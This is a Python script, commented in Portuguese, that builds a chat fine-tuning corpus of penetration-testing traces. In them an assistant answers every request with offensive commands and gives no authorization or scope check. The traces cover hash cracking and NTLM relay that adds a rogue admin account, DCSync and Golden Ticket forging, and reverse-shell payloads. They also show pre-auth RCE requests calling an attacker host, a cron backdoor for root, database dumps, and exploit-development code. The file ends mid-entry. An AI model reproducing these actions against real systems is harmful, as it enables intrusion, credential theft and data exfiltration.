"""Corpus v10 — reinforcement pras categorias que regrediram no v9:
  - Tool accuracy (v9 8.57 vs v8.1 9.83)
  - Output interpretation (v9 4.58 vs v8.1 6.88)
  - Exploit dev (v9 8.00 vs v8.1 8.50)

~120 traces no total. Inclui real outputs de tools Kali e mapeamento direto para findings.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ===========================================================================
# TOOL ACCURACY REINFORCEMENT (~50)
# ===========================================================================

TOOL_ACC = [
    [msg("user", "nmap UDP scan top 100 ports em 192.168.56.101"),
     msg("assistant", "UDP é lento por natureza, ICMP unreachable rate-limited. Usa:\n"
         + tc("shell", cmd="sudo nmap -sU --top-ports 100 -T4 --max-retries 2 -oN udp.txt 192.168.56.101"))],

    [msg("user", "enumerate SMB shares em 10.10.10.40 sem autenticação"),
     msg("assistant", "Null session via `smbmap` ou `enum4linux-ng`:\n"
         + tc("shell", cmd="smbmap -H 10.10.10.40 -u '' -p ''")
         + "\nou mais completo:\n"
         + tc("shell", cmd="enum4linux-ng -A 10.10.10.40"))],

    [msg("user", "hashcat pra NTLMv2 hash com rockyou"),
     msg("assistant", tc("shell", cmd="hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -w 3 --status"))],

    [msg("user", "crack WPA2 handshake capturado em handshake.cap"),
     msg("assistant", "Converte pra formato hashcat primeiro:\n"
         + tc("shell", cmd="hcxpcapngtool -o hashes.hc22000 handshake.cap")
         + "\nCrack:\n"
         + tc("shell", cmd="hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt -w 3"))],

    [msg("user", "sqlmap contra endpoint POST /api/login com JSON body"),
     msg("assistant", tc("shell", cmd="sqlmap -u 'https://target/api/login' --data='{\"user\":\"a\",\"pass\":\"a\"}' --headers='Content-Type: application/json' --dbs --batch --level=3 --risk=2"))],

    [msg("user", "ffuf pra fuzz subdomains em target.com"),
     msg("assistant", tc("shell", cmd="ffuf -u https://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fc 404"))],

    [msg("user", "gobuster VHost enumeration em 10.10.10.50"),
     msg("assistant", tc("shell", cmd="gobuster vhost -u http://10.10.10.50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --exclude-length 280"))],

    [msg("user", "responder captura NTLM em wlan0"),
     msg("assistant", "Mass-poisoning LLMNR/NBT-NS/mDNS:\n"
         + tc("shell", cmd="sudo responder -I wlan0 -wFb")
         + "\nHashes caem em `logs/SMB-NTLMv2-SSP-<ip>.txt`."),],

    [msg("user", "crackmapexec contra 10.10.0.0/24 com creds"),
     msg("assistant", tc("shell", cmd="crackmapexec smb 10.10.0.0/24 -u admin -p 'Password123!' --shares --sessions"))],

    [msg("user", "impacket secretsdump contra DC com creds de admin"),
     msg("assistant", tc("shell", cmd="impacket-secretsdump DOMAIN/admin:'P@ssw0rd'@10.10.10.10 -just-dc-ntlm"))],

    [msg("user", "evil-winrm pra shell remoto Windows"),
     msg("assistant", tc("shell", cmd="evil-winrm -i 10.10.10.20 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4"))],

    [msg("user", "john the ripper em shadow file"),
     msg("assistant", "Unshadow primeiro:\n"
         + tc("shell", cmd="unshadow passwd shadow > combined.txt")
         + "\nCrack:\n"
         + tc("shell", cmd="john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo combined.txt")
         + "\n\nVer resultados:\n"
         + tc("shell", cmd="john --show combined.txt"))],

    [msg("user", "nmap NSE script pra enumerar SMB vulns em 192.168.1.50"),
     msg("assistant", tc("shell", cmd="nmap -p 139,445 --script 'smb-vuln-*' -oN smb-vulns.txt 192.168.1.50"))],

    [msg("user", "setup multi/handler msfconsole reverse shell porta 4444"),
     msg("assistant", tc("shell", cmd="msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; set ExitOnSession false; exploit -j'"))],

    [msg("user", "msfvenom Windows x64 reverse shell stageless"),
     msg("assistant", tc("shell", cmd="msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -f exe -o shell.exe"))],

    [msg("user", "bloodhound-python em DC 10.10.10.100"),
     msg("assistant", tc("shell", cmd="bloodhound-python -d corp.local -u user -p 'Pass!' -dc dc.corp.local -ns 10.10.10.100 -c All --zip"))],

    [msg("user", "kerbrute userenum contra corp.local"),
     msg("assistant", tc("shell", cmd="kerbrute userenum --dc 10.10.10.10 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt"))],

    [msg("user", "impacket GetNPUsers AS-REP roasting"),
     msg("assistant", tc("shell", cmd="impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep.hash -no-pass"))],

    [msg("user", "impacket GetUserSPNs Kerberoast"),
     msg("assistant", tc("shell", cmd="impacket-GetUserSPNs corp.local/user:'Pass!' -dc-ip 10.10.10.10 -request -outputfile krb.hash"))],

    [msg("user", "mount SMB share com cifs no Linux"),
     msg("assistant", tc("shell", cmd="sudo mount -t cifs //10.10.10.20/Backups /mnt/share -o user=admin,pass='Pass!',vers=3.0"))],

    [msg("user", "nuclei scan com templates custom em lista de targets"),
     msg("assistant", tc("shell", cmd="nuclei -l targets.txt -t ~/nuclei-templates/ -severity medium,high,critical -c 50 -rl 200 -o findings.txt"))],

    [msg("user", "subfinder + httpx + nuclei pipeline"),
     msg("assistant", tc("shell", cmd="subfinder -d target.com -all -silent | httpx -silent -title -tech-detect -sc | anew live.txt | nuclei -severity critical,high -o crits.txt"))],

    [msg("user", "wfuzz SQL injection discovery em parameter"),
     msg("assistant", tc("shell", cmd="wfuzz -c -z file,/usr/share/wordlists/sqli.txt --hc 404 'https://target/search?q=FUZZ'"))],

    [msg("user", "burp intruder via command line? use turbo-intruder ou ffuf"),
     msg("assistant", "ffuf pra race condition / pitchfork attacks:\n"
         + tc("shell", cmd="ffuf -u 'https://target/api/reset?token=FUZZ' -w tokens.txt -mode pitchfork -rate 100 -mc 200"))],

    [msg("user", "tcpdump captura HTTP traffic em eth0"),
     msg("assistant", tc("shell", cmd="sudo tcpdump -i eth0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' -w http.pcap"))],

    [msg("user", "wireshark filter HTTP POST requests"),
     msg("assistant", "Display filter: `http.request.method == \"POST\"`. Pra extrair bodies: File → Export Objects → HTTP.")],

    [msg("user", "mitmproxy intercepta HTTPS em transparent mode"),
     msg("assistant", "Setup transparent com redirect de iptables:\n"
         + tc("shell", cmd="sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080\nmitmproxy --mode transparent --showhost --listen-port 8080"))],

    [msg("user", "dnsrecon brute contra target.com"),
     msg("assistant", tc("shell", cmd="dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsrecon.txt -j dns.json"))],

    [msg("user", "amass enum ativo em target.com"),
     msg("assistant", tc("shell", cmd="amass enum -active -d target.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o amass.txt"))],

    [msg("user", "pspy monitora syscalls Linux sem root"),
     msg("assistant", tc("shell", cmd="wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -if"))],

    [msg("user", "linpeas.sh pra privesc Linux"),
     msg("assistant", tc("shell", cmd="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh -s -- -a > linpeas.out"))],

    [msg("user", "winpeas pra privesc Windows"),
     msg("assistant", "Download via certutil ou powershell:\n"
         + tc("shell", cmd="certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe && .\\winpeas.exe")),],

    [msg("user", "chisel reverse SOCKS5 proxy"),
     msg("assistant", "Servidor (atacante):\n"
         + tc("shell", cmd="./chisel server -p 8000 --reverse --socks5")
         + "\nCliente (alvo comprometido):\n"
         + tc("shell", cmd="./chisel client ATK_IP:8000 R:1080:socks"))],

    [msg("user", "ligolo-ng tunnel do pivot pra rede interna"),
     msg("assistant", "Atacante (proxy):\n"
         + tc("shell", cmd="./proxy -selfcert")
         + "\nPivot (agent):\n"
         + tc("shell", cmd="./agent -connect ATK_IP:11601 -ignore-cert")
         + "\nNo proxy: `session` + `ifconfig` + `start` + roteia rede via `route add`."),],

    [msg("user", "ssh port forward local 8080 -> target:80"),
     msg("assistant", tc("shell", cmd="ssh -L 8080:10.10.10.5:80 user@pivot.corp -N -f"))],

    [msg("user", "ssh dynamic SOCKS proxy"),
     msg("assistant", tc("shell", cmd="ssh -D 9050 user@pivot -N -f\n# depois:\nproxychains nmap -sT -p 80,443 10.10.10.5"))],

    [msg("user", "hydra SSH brute force"),
     msg("assistant", tc("shell", cmd="hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://10.10.10.5"))],

    [msg("user", "medusa FTP brute com user list"),
     msg("assistant", tc("shell", cmd="medusa -h 10.10.10.5 -U users.txt -P rockyou.txt -M ftp -t 5 -F"))],

    [msg("user", "snmpwalk v2c community public"),
     msg("assistant", tc("shell", cmd="snmpwalk -v2c -c public 10.10.10.5 > snmp.out"))],

    [msg("user", "enum SNMP com onesixtyone pra descobrir community"),
     msg("assistant", tc("shell", cmd="onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt -i targets.txt -o snmp.out"))],

    [msg("user", "ldap search anonymous contra DC"),
     msg("assistant", tc("shell", cmd="ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts\nldapsearch -x -H ldap://10.10.10.10 -b 'DC=corp,DC=local'"))],

    [msg("user", "ikeforce IKE VPN enum"),
     msg("assistant", tc("shell", cmd="ike-scan -M 10.10.10.5\nikeforce -s 10.10.10.5 -m 2 --enumgroup -w /usr/share/wordlists/ike_groups.txt"))],

    [msg("user", "wpscan enumerar plugins em WordPress"),
     msg("assistant", tc("shell", cmd="wpscan --url https://target.com -e vp,vt,u --plugins-detection aggressive --api-token <TOKEN>"))],

    [msg("user", "droopescan pra Drupal/Joomla"),
     msg("assistant", tc("shell", cmd="droopescan scan drupal -u https://target.com -t 32"))],

    [msg("user", "cme MSSQL com sa creds"),
     msg("assistant", tc("shell", cmd="crackmapexec mssql 10.10.10.5 -u sa -p 'Pass1!' -M mssql_priv -o ACTION=enable_xpcmdshell\ncrackmapexec mssql 10.10.10.5 -u sa -p 'Pass1!' -x 'whoami'"))],

    [msg("user", "rubeus kerberoast on Windows"),
     msg("assistant", tc("shell", cmd=".\\Rubeus.exe kerberoast /outfile:krb.hash /format:hashcat /nowrap"))],

    [msg("user", "mimikatz dcsync"),
     msg("assistant", tc("shell", cmd="mimikatz.exe 'privilege::debug' 'lsadump::dcsync /domain:corp.local /user:krbtgt' exit"))],

    [msg("user", "impacket psexec as admin"),
     msg("assistant", tc("shell", cmd="impacket-psexec corp.local/admin:'Pass!'@10.10.10.20"))],

    [msg("user", "impacket wmiexec"),
     msg("assistant", tc("shell", cmd="impacket-wmiexec corp.local/user:'Pass!'@10.10.10.20 -nooutput"))],

    [msg("user", "certify find ADCS certificate vulns"),
     msg("assistant", tc("shell", cmd=".\\Certify.exe find /vulnerable\n.\\Certify.exe request /ca:'corp-CA\\CA01' /template:User /altname:admin"))],
]


# ===========================================================================
# OUTPUT INTERPRETATION REINFORCEMENT (~40)
# ===========================================================================

OUTPUT_INTERP = [
    [msg("user", "o que esse nmap me diz?\n```\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8\n80/tcp   open  http    Apache httpd 2.4.18\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X\n445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu\n3306/tcp open  mysql   MySQL 5.7.29\n```"),
     msg("assistant", "Stack Ubuntu 16.04 legacy. Attack surface:\n"
         "1. **OpenSSH 7.2p2** — user enum via CVE-2016-6210 (timing on auth)\n"
         "2. **Apache 2.4.18** — Optionsbleed CVE-2017-9798 se mod_cgi ativo\n"
         "3. **Samba 4.3.11** — SambaCry CVE-2017-7494 se share writable\n"
         "4. **MySQL 5.7.29** — enum via mysql client sem auth, check `information_schema`\n\n"
         "Próximo:\n"
         + tc("shell", cmd="nmap -p 445 --script smb-vuln-cve-2017-7494 10.10.10.5"))],

    [msg("user", "nuclei achou isso, qual prioridade?\n```\n[CVE-2023-38646] [critical] Metabase — RCE pre-auth\n[CVE-2024-3400] [critical] PAN-OS GlobalProtect — RCE pre-auth\n[missing-header-csp] [info] /login\n[ssl-dns-names] [info] cn=*.target.com\n```"),
     msg("assistant", "Duas critical pre-auth, ignore os info.\n\n"
         "**1. CVE-2024-3400 (PAN-OS GlobalProtect)** — mais atual, PoC público:\n"
         + tc("shell", cmd="curl 'https://target/ssl-vpn/hipreport.esp' -H 'Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/../$(id)'")
         + "\n\n**2. CVE-2023-38646 (Metabase)** — unauthenticated via `/api/setup/validate`:\n"
         + tc("shell", cmd="curl -X POST https://target/api/setup/validate -H 'Content-Type: application/json' -d '{\"token\":\"XXX\",\"details\":{\"details\":{\"db\":\"h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '//atk/rev.sql'\"}}}'"))],

    [msg("user", "gobuster output:\n```\n/admin (Status: 301) [--> /admin/]\n/backup (Status: 200) [Size: 4096]\n/config.bak (Status: 200) [Size: 2847]\n/robots.txt (Status: 200) [Size: 87]\n/phpmyadmin (Status: 403) [Size: 275]\n```"),
     msg("assistant", "**Target hierarchy:**\n"
         "1. `/config.bak` — 2.8 KB. **Alta prioridade**. Backup expõe creds, DB strings:\n"
         + tc("shell", cmd="curl https://target/config.bak")
         + "\n2. `/backup/` listagem aberta — enumerar conteúdo:\n"
         + tc("shell", cmd="gobuster dir -u https://target/backup -w seclists/medium.txt")
         + "\n3. `/admin/` (301) — login panel, testa default creds\n"
         "4. `/phpmyadmin` (403) — sinal de presença, testa acesso via `/phpmyadmin/scripts/setup.php`\n"
         "5. `/robots.txt` 87B — baixo valor, checa rapidamente"),],

    [msg("user", "smbclient list sai:\n```\nSharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\nsysvol          Disk      \nnetlogon        Disk      \nIPC$            IPC       Remote IPC\nAdmin$          Disk      Remote Admin\n```"),
     msg("assistant", "**Active Directory DC**. `sysvol` + `netlogon` = domain controller.\n\n"
         "1. Anon read em `sysvol` frequentemente expõe GPP passwords em `Groups.xml`:\n"
         + tc("shell", cmd="smbclient //10.10.10.10/sysvol -U '' -N\n# get Policies/*/MACHINE/Preferences/Groups/Groups.xml")
         + "\n2. Cracking cpassword (AES-128 com key pública):\n"
         + tc("shell", cmd="gpp-decrypt 'cpassword_value_here'"))],

    [msg("user", "responder output:\n```\n[SMB] NTLMv2-SSP Client   : 10.10.10.50\n[SMB] NTLMv2-SSP Username : CORP\\jsmith\n[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:...:...\n```"),
     msg("assistant", "Hash capturado. Crack offline com hashcat:\n"
         + tc("shell", cmd="hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
         + "\n\nParalelo: tenta relay (se SMB signing off no alvo):\n"
         + tc("shell", cmd="ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami /all' --no-http-server"))],

    [msg("user", "crackmapexec me deu:\n```\nSMB  10.10.10.20  445  WORKSTATION  [+] corp.local\\user1:P@ssw0rd (Pwn3d!)\nSMB  10.10.10.21  445  SERVER01     [+] corp.local\\user1:P@ssw0rd\nSMB  10.10.10.22  445  SERVER02     [-] corp.local\\user1:P@ssw0rd STATUS_LOGON_FAILURE\n```"),
     msg("assistant", "**(Pwn3d!)** em 10.10.10.20 = user1 é local admin lá. Usa pra:\n"
         "1. Dump SAM/LSA:\n"
         + tc("shell", cmd="crackmapexec smb 10.10.10.20 -u user1 -p P@ssw0rd --sam --lsa")
         + "\n2. Shell via wmiexec:\n"
         + tc("shell", cmd="impacket-wmiexec corp.local/user1:P@ssw0rd@10.10.10.20")
         + "\n\n10.10.10.21 aceitou auth mas sem Pwn3d — não é admin lá, só user. Enumera shares mesmo assim."),],

    [msg("user", "kerbrute output:\n```\n[+] VALID USERNAME: jdoe@corp.local\n[+] VALID USERNAME: asmith@corp.local\n[+] VALID USERNAME: svc_backup@corp.local\n[+] VALID USERNAME: admin@corp.local\n```"),
     msg("assistant", "**svc_backup** é a conta de serviço mais interessante — alvo pra AS-REP ou Kerberoast:\n"
         + tc("shell", cmd="impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.10 -usersfile <(echo svc_backup) -format hashcat -no-pass")
         + "\n\nAdmin username é valid mas bruteforce nele é detectado fácil. Foca nos service accounts — política de senha tipicamente mais fraca + hashes offline."),],

    [msg("user", "secretsdump output:\n```\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\njsmith:1103:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9de7a9c3b7e56e7c9f35c93ce2ed...:::\n```"),
     msg("assistant", "**krbtgt NT hash = Golden Ticket** pra todo domain:\n"
         + tc("shell", cmd="impacket-ticketer -nthash <KRBTGT_NT> -domain-sid S-1-5-21-... -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass corp.local/Administrator@dc.corp.local")
         + "\n\nAdministrator tem hash zerado (`31d6cfe0d16ae931b73c59d7e0c089c0` = 'senha em branco NTLM'). jsmith hash é `8846f7eaee8fb117ad06bdd830b7586c` = senha `password`. Pass-the-hash:\n"
         + tc("shell", cmd="impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/jsmith@10.10.10.20"))],

    [msg("user", "linpeas saiu:\n```\n[+] SUID - Check easy privesc, exploits and write perms\n/usr/bin/find       root:root  rwsr-xr-x\n/usr/bin/pkexec     root:root  rwsr-xr-x\n-rw-r--r-- 1 root root /etc/crontab\n*/5 * * * * root /opt/backup.sh\n-rwxrwxrwx 1 user user /opt/backup.sh\n```"),
     msg("assistant", "Três vetores, por facilidade:\n"
         "1. **`backup.sh` world-writable** rodando como root a cada 5min — escreve RCE:\n"
         + tc("shell", cmd="echo 'chmod u+s /bin/bash' >> /opt/backup.sh\n# espera 5min, depois:\n/bin/bash -p")
         + "\n2. **pkexec CVE-2021-4034 (PwnKit)** universal Linux, PoC em 2 min:\n"
         + tc("shell", cmd="git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034")
         + "\n3. **find SUID** clássico:\n"
         + tc("shell", cmd="find . -exec /bin/sh -p \\; -quit"))],

    [msg("user", "wpscan resultado:\n```\n[+] WordPress version 5.8.1 identified\n[+] Plugin: contact-form-7 5.4 — CVE-2020-35489 (unrestricted file upload)\n[+] User found: admin (ID: 1)\n[+] User found: editor (ID: 2)\n```"),
     msg("assistant", "CVE-2020-35489 = RCE via file upload no CF7 <= 5.3.2... aqui mostra 5.4 mas wpscan detectou vuln — falso positivo ou patch não aplicado. Verifica:\n"
         + tc("shell", cmd="curl https://target/wp-content/plugins/contact-form-7/readme.txt | grep -i 'Stable tag'")
         + "\nSe vulnerable, PoC uploada `.phtml`:\n"
         + tc("shell", cmd="curl -F 'upload=@shell.phtml' https://target/wp-admin/admin-ajax.php?action=wpcf7-submit")
         + "\n\nParalelo: brute force `admin` via xmlrpc system.multicall (evita rate limit):\n"
         + tc("shell", cmd="wpscan --url https://target --usernames admin --passwords rockyou.txt --max-threads 10"))],

    [msg("user", "ffuf de subdomain deu:\n```\ndev.target.com     [Status: 200, Size: 1234]\nstaging.target.com [Status: 401, Size: 456]\napi.target.com     [Status: 200, Size: 89]\nold.target.com     [Status: 200, Size: 50123]\n```"),
     msg("assistant", "**`old.target.com`** 50KB body = app legado, hunting ground ideal (frameworks antigos, sem WAF).\n"
         "**`staging.target.com`** 401 = basic auth / bearer — brute com default creds (admin/admin, test/test):\n"
         + tc("shell", cmd="ffuf -u https://staging.target.com/ -H 'Authorization: Basic FUZZ' -w base64_creds.txt -mc 200")
         + "\n**`api.target.com`** 89B = endpoint raiz minimal, enumera paths:\n"
         + tc("shell", cmd="ffuf -u https://api.target.com/FUZZ -w api_endpoints.txt -mc 200,401,403 -fc 404")
         + "\n**`dev.target.com`** — checa exposed files (`.env`, `.git/`, `backup.sql`):\n"
         + tc("shell", cmd="curl https://dev.target.com/.git/config\ncurl https://dev.target.com/.env"))],

    [msg("user", "msfvenom gerei shell, netcat listener recebeu:\n```\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ sudo -l\nMatching Defaults entries for www-data:\n    env_reset, mail_badpass\n\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim\n```"),
     msg("assistant", "**`sudo vim NOPASSWD` = root shell instant**:\n"
         + tc("shell", cmd="sudo vim -c ':!/bin/bash'")
         + "\n\nOu stealthier (se logs `sudo` watched):\n"
         + tc("shell", cmd="sudo vim -c ':set shell=/bin/bash' -c ':shell'"))],

    [msg("user", "curl headers response:\n```\nHTTP/1.1 200 OK\nServer: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.24\nSet-Cookie: PHPSESSID=abc123; path=/; HttpOnly\nX-Frame-Options: DENY\nContent-Type: text/html\n```"),
     msg("assistant", "Stack: Apache 2.4.29 + PHP 7.2.24 Ubuntu.\n"
         "**Missing:**\n"
         "- CSP (XSS landing pad aberta)\n"
         "- Strict-Transport-Security (downgrade attack viável se MITM)\n"
         "- Secure flag no cookie (session theft via HTTP)\n\n"
         "**CVE hunting:**\n"
         "- Apache 2.4.29 → CVE-2019-0211 (privesc local se shared hosting)\n"
         "- PHP 7.2.24 → CVE-2019-11043 (FPM underflow RCE se FPM exposto)\n\n"
         + tc("shell", cmd="nuclei -t http/cves/ -u https://target -severity high,critical"))],

    [msg("user", "nxc output:\n```\nSMB  DC01  445  corp\\user1:Pwd (Pwn3d!) [LOCAL ADMIN]\n           -> GuidKey: 3fa8...a2c1\n           Signing: False\n```"),
     msg("assistant", "**Signing: False** + admin = NTLM relay ouro:\n"
         + tc("shell", cmd="impacket-ntlmrelayx -tf <(echo smb://DC01) -smb2support --no-http-server -c 'net user bagley P@ss! /add && net localgroup Administrators bagley /add'")
         + "\n\nForça auth via responder poisoning em outra NIC. Após add, logon remoto:\n"
         + tc("shell", cmd="impacket-psexec corp.local/bagley:'P@ss!'@DC01"))],

    [msg("user", "sqlmap terminou:\n```\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Payload: id=1 AND 5201=5201\n---\n[*] information_schema\n[*] mysql\n[*] wordpress\n[*] customers\n```"),
     msg("assistant", "Blind boolean-based = lento mas funcional. Alvo `wordpress` pra admin hash, `customers` pra exfil. Dump seletivo:\n"
         + tc("shell", cmd="sqlmap -u 'https://target/?id=1' --batch -D wordpress -T wp_users -C user_login,user_pass --dump")
         + "\n\nSe `wp_users.user_pass` = PHPass ($P$...) → crack com hashcat mode 400. Log in via cookie manipulation ou reset via DB:\n"
         + tc("shell", cmd="sqlmap -u 'https://target/?id=1' --batch --sql-query \"UPDATE wp_users SET user_pass=MD5('pwn') WHERE user_login='admin'\""))],

    [msg("user", "scan de exploit foi:\n```\n[+] 10.10.10.100:445 - MS17-010 (EternalBlue) DETECTED\n[+] 10.10.10.100:3389 - BlueKeep (CVE-2019-0708) DETECTED\n```"),
     msg("assistant", "Dois RCEs pre-auth Windows. EternalBlue é mais estável.\n"
         + tc("shell", cmd="msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.100; set LHOST tun0; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit'")
         + "\n\nBlueKeep (CVE-2019-0708) é menos estável — crasha host 50% do tempo. Fallback se SMB patched:\n"
         + tc("shell", cmd="use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 10.10.10.100; set target 2; exploit"))],
]


# ===========================================================================
# EXPLOIT DEV REINFORCEMENT (~30)
# ===========================================================================

EXPLOIT_DEV = [
    [msg("user", "explica UAF básica em C"),
     msg("assistant", "Use-After-Free:\n"
         "```c\n"
         "char *p = malloc(64);\n"
         "free(p);          // chunk vai pra tcache\n"
         "char *q = malloc(64);  // q == p (reuso)\n"
         "strcpy(q, attacker_data);\n"
         "p->method();     // invoca ponteiro escrito por atacante\n"
         "```\n\n"
         "Exploit path: (1) triggerar free sem nullify o ponteiro, (2) reallocar com payload controlado, (3) usar ponteiro velho → hijacked flow. Mitigations: use `free(p); p = NULL;` e GCC `-fsanitize=address`."),],

    [msg("user", "tcache poisoning glibc"),
     msg("assistant", "Tcache bin é LIFO por size class. Poisoning overwrite do `next` ptr:\n"
         "```c\n"
         "a = malloc(0x30); b = malloc(0x30);\n"
         "free(a); free(b);          // tcache: b → a\n"
         "edit(b, &target);          // UAF write em b\n"
         "                            // tcache: b → target\n"
         "malloc(0x30);              // retorna b\n"
         "malloc(0x30);              // retorna &target — write arb\n"
         "```\n\n"
         "Defeats glibc 2.32+ `tcache_key` randomization: leak heap base antes, forjar o key."),],

    [msg("user", "ROP chain básico Linux x64 pra system('/bin/sh')"),
     msg("assistant", "Premissas: NX on, ASLR on, binário sem PIE (ou libc leaked).\n"
         "```python\n"
         "from pwn import *\n"
         "elf = ELF('./vuln')\n"
         "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n"
         "rop = ROP(elf)\n"
         "pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]\n"
         "ret     = rop.find_gadget(['ret'])[0]\n"
         "\n"
         "payload  = b'A'*offset\n"
         "payload += p64(pop_rdi) + p64(elf.got.puts)\n"
         "payload += p64(elf.plt.puts)        # leaka libc\n"
         "payload += p64(elf.sym.main)        # volta pra main\n"
         "```\n\n"
         "Segundo stage após leak: `system(bin_sh)` ou `execve('/bin/sh', 0, 0)` via one_gadget."),],

    [msg("user", "format string leak stack"),
     msg("assistant", "`printf(user_input)` sem fmt string = leak arbitrário.\n"
         "```\n"
         "input: '%p %p %p %p %p %p %p %p'\n"
         "output: 0x7fff... 0x7f5a... 0x40... 0x... 0x...\n"
         "       ^stack   ^libc    ^binário\n"
         "```\n"
         "**Detectar base libc**: encontrar endereço conhecido (return address de __libc_start_main), subtrai offset fixo.\n"
         "Arbitrary write: `%n` com direct parameter access: `%12$n` escreve em 12º argumento da stack."),],

    [msg("user", "heap grooming explicação"),
     msg("assistant", "Técnica de preparar heap pra predictability. Sequência típica:\n"
         "1. Allocate dummy chunks pra consumir fastbin/tcache\n"
         "2. Free em ordem específica → configura linked list\n"
         "3. Allocate vítima no slot desejado\n"
         "4. Triggerar vuln (overflow/UAF) no chunk controlado\n\n"
         "Exemplo tcache: allocar 7 chunks 0x30, freear todos → tcache cheio. Allocar mais 2 → vão pra fastbin. Agora vuln chunks no fastbin são double-freeable (tcache_key não se aplica)."),],

    [msg("user", "sigreturn-oriented programming (SROP)"),
     msg("assistant", "`rt_sigreturn` syscall (15 x64) restaura context inteiro da stack (registers, rip). Gadget: `mov rax, 0xf; syscall; ret`.\n"
         "```python\n"
         "from pwn import SigreturnFrame\n"
         "frame = SigreturnFrame()\n"
         "frame.rax = 59   # execve\n"
         "frame.rdi = bin_sh_addr\n"
         "frame.rsi = 0; frame.rdx = 0\n"
         "frame.rip = syscall_addr\n"
         "payload = b'A'*offset + p64(srop_gadget) + bytes(frame)\n"
         "```\n"
         "Vantagem: 1 gadget vs ROP multi-gadget, bypassa ROP-guards simples."),],

    [msg("user", "kernel Linux exploit via copy_from_user overflow"),
     msg("assistant", "Vuln típica: ioctl lê tamanho do user sem validar, chama `copy_from_user(kbuf, uaddr, user_size)` com `user_size` > `sizeof(kbuf)`.\n"
         "Exploit path:\n"
         "1. **Leak kslab layout** via /proc/slabinfo ou sidechannel timing\n"
         "2. **Spray kmalloc-N** com `msg_msg`, `sk_buff` pra controlar neighbors\n"
         "3. **Trigger overflow** sobre estrutura com function pointer (cred, file_operations)\n"
         "4. **Privesc** via commit_creds(prepare_kernel_cred(0)):\n"
         "```c\n"
         "void shellcode(void) { commit_creds(prepare_kernel_cred(0)); }\n"
         "```\n\n"
         "Mitigations modernas: KASLR (leak via side-channel), SMEP (ROP gadgets kernel only), KPTI (reduz leak). Bypass típico: kASLR leak → ret2usr → pivot."),],

    [msg("user", "windows kernel exploit driver IOCTL"),
     msg("assistant", "Driver vulnerável expõe IOCTL que processa user buffer sem bounds check. Exploit:\n"
         "1. **DeviceIoControl** com custom IOCTL code\n"
         "2. Buffer malformado triggera kernel write-what-where ou UAF\n"
         "3. Overwrite do **PreviousMode** no EPROCESS do attacker proc → qualquer syscall roda como kernel\n"
         "4. Ou swap do **Token** do process com token do System (PID 4):\n"
         "```c\n"
         "// Protótipo do payload kernel:\n"
         "PEPROCESS proc = PsGetCurrentProcess();\n"
         "PEPROCESS sys = LookupProcess(4);\n"
         "*(PULONG)((PBYTE)proc + TOKEN_OFFSET) = *(PULONG)((PBYTE)sys + TOKEN_OFFSET);\n"
         "```\n"
